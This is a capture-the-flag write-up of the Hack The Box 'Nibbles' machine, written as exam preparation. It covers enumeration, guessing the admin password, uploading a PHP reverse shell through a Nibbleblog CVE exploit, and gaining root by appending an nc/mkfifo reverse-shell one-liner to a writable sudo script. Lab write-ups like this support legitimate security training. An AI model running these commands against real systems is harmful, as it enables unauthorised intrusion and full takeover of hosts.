---
layout: post
title:  HTB Nibbles Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-04 07:00:00 +0300
image:  '/images/htb_nibbles.png'
tags:   [Write-ups, HTB, OSCP+, Linux, Easy, CVE, PHP-Reverse-Shell, Sudo-l, Bash-Script, Alternative-Without-Metasploit]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [Feroxbuster](#feroxbuster)
  - [Guessing the Password of admin user](#guessing-the-password-of-admin-user)
- [Foothold](#foothold)
  - [Nibbleblog CVE-2015-6967 without Metasploit to upload PHP reverse shell and get access as user nibbler](#nibbleblog-cve-2015-6967-without-metasploit-to-upload-php-reverse-shell-and-get-access-as-user-nibbler)
- [Privilege Escalation](#privilege-escalation)
  - [sudo -l and finding writeable monitor.sh bash script](#sudo--l-and-finding-writeable-monitorsh-bash-script)
  - [Writing reverse shell into monitor.sh and getting shell as root](#writing-reverse-shell-into-monitorsh-and-getting-shell-as-root)

# Enumeration
### Nmap
```shell
nmap -A -T4 -p- -Pn 10.129.146.200
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 14:05 EST
Nmap scan report for 10.129.146.200
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/4%OT=22%CT=1%CU=44759%PV=Y%DS=2%DC=T%G=Y%TM=6729
OS:1B37%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
OS:ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   32.54 ms 10.10.14.1
2   32.60 ms 10.129.146.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.82 seconds
```

### Web Enumeration
Nmap found a website at port 80. If we visit the website:
```shell
http://10.129.146.200/
```
And examine the source code with our web browser, we will see the following:
```html
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
This gives you a hint that there is a /nibbleblog/ directory and "Nothing interesting" there.

But we are too curious and want to take a look:
```shell
http://10.129.146.200/nibbleblog
```
It looks like a blog page.

### Feroxbuster
We will use Feroxbuster to enumerate further directories inside the /nibbleblog/ directory:


```shell
feroxbuster -u http://10.129.146.200/nibbleblog/ -r
```

```shell
<SNIP>
200      GET        2l        6w       97c http://10.129.146.200/nibbleblog/content/private/tags.xml
200      GET        2l       13w      370c http://10.129.146.200/nibbleblog/content/private/users.xml
200      GET        2l       14w      431c http://10.129.146.200/nibbleblog/content/private/comments.xml
200      GET        2l        6w       93c http://10.129.146.200/nibbleblog/content/private/posts.xml
200      GET        0l        0w        0c http://10.129.146.200/nibbleblog/content/private/shadow.php
200      GET        2l       50w     1936c http://10.129.146.200/nibbleblog/content/private/config.xml
200      GET        0l        0w        0c http://10.129.146.200/nibbleblog/content/private/keys.php
<SNIP>
```
If we examine the results, we can see that there is a file named users.xml.

There we can see that the user admin tried to log in from multiple IPs. So, now we know that the user admin exists.

```shell
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
<blacklist type="string" ip="10.10.14.206">
<date type="integer">1730748024</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```
### Guessing the Password of admin user
We couldn't find much more information. So we will just try to guess the password of the user admin.

We can find the login portal looking at the Feroxbuster results:
```shell
http://10.129.146.200/nibbleblog/admin.php
```
We tried the following credentials and we were lucky, they gave us access successfully:
```shell
admin:nibbles
```
# Foothold
### Nibbleblog CVE-2015-6967 without Metasploit to upload PHP reverse shell and get access as user nibbler
If we examine the README file from the Feroxbuster results, we will see the version of Nibbleblog inside:
```shell
http://10.129.146.200/nibbleblog/README
```

```shell
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com
```

Searching for vulnerabilities and exploits for this Nibbleblog version using Google, we found the following exploit:
```shell
https://github.com/dix0nym/CVE-2015-6967
```

We can get a reverse shell following these steps and using the following commands:
```shell
# Get the exploit from GitHub
git clone https://github.com/dix0nym/CVE-2015-6967
cd CVE-2015-6967
```

```shell
# Start a nc listener on Kali
nc -lvnp 8080
```

```shell
# Get a PHP reverse shell from Ivan Sincek from revshells.com with Kali IP and port 8080
https://www.revshells.com/

# revshells.com Configuration
Shell name: PHP Ivan Sincek
IP: Our Kali tun0 IP
Port: 8080
Type: nc
Shell: /bin/sh
Encoding: None

# Copy the shell and put it into a file in CVE-2015-6967 folder, name it shell.php
```

```shell
# Use the exploit to upload the php shell
python3 exploit.py --url http://10.129.146.200/nibbleblog/ --username admin --password nibbles --payload shell.php
```

```shell
# Our nc listener will get triggered and grant us shell access as the user nibbler
listening on [any] 8080 ...
ls
connect to [10.10.14.206] from (UNKNOWN) [10.129.146.200] 52964
SOCKET: Shell has connected! PID: 1845
db.xml
image.php

# Now upgrade the shell to interactive
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Our shell will change to
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```
### User Flag
Now we can get the user.txt flag:
```shell
cd ~
cat user.txt
```
# Privilege Escalation
### sudo -l and finding writeable monitor.sh bash script
Using sudo -l we find out that the user nibbler can run monitor.sh as root without password:
```shell
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Let's inspect the bash script monitor.sh:
```shell
cd ~
unzip personal.zip
cat /home/nibbler/personal/stuff/monitor.sh
```
It is a quite long script, but since everybody can write on it, we can just change the contents to escalate our privileges:
```shell
# Pay attention to -rwxrwxrwx permissions
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al
ls -al
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```
We will abuse this to write a reverse shell into the monitor.sh that connects to our nc listener when running monitor.sh as sudo.

### Writing reverse shell into monitor.sh and getting shell as root

Let's start a nc listener on Kali first:
```shell
nc -lvnp 8080
```
And now overwrite the contents of the monitor.sh script with the following reverse shell:
```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.206 8000 > /tmp/f" >> monitor.sh
```
Now we just need to run the script monitor.sh with sudo and we will trigger the reverse shell, giving us a response in our nc listener and shell as root:
```shell
sudo /home/nibbler/personal/stuff/monitor.sh
```
```shell
listening on [any] 8000 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.146.200] 52416
# whoami
root
```
Upgrade the shell once we get a response in our nc listener:
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### Root Flag
We can find the root.txt flag at the following directory:
```shell
cat /root/root.txt
```